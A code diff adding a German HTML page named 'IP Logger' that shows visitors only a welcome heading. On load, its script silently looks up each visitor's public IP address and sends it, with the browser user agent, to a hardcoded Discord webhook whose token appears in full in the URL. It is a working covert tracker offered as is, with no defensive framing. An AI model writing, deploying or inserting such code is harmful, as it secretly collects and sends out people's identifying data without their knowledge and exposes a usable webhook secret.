@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <title>IP Logger</title>
+</head>
+<body>
+<h1>Willkommen!</h1>
+<script>
+  async function sendIpToDiscord() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      const ip = data.ip;
+
+      const payload = {
+        username: '📡 IP-Logger',
+        embeds: [{
+          title: '🌍 Neue Verbindung',
+          color: 3447003,
+          fields: [
+            { name: '🔢 IP-Adresse', value: ip, inline: false },
+            { name: '🧭 User-Agent', value: navigator.userAgent, inline: false }
+          ]
+        }]
+      };
+
+      await fetch('https://discord.com/api/webhooks/1367308712204701727/_uwetsiVEzxNj-LfEGYRvEFOoNw4g3aH7wuikxRYDzb_CjywPe4akQ_ScW5FJWrjahnQ', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+    } catch (e) {
+      console.error('Fehler beim Senden:', e);
+    }
+  }
+
+  sendIpToDiscord();
+</script>
+</body>
+</html>
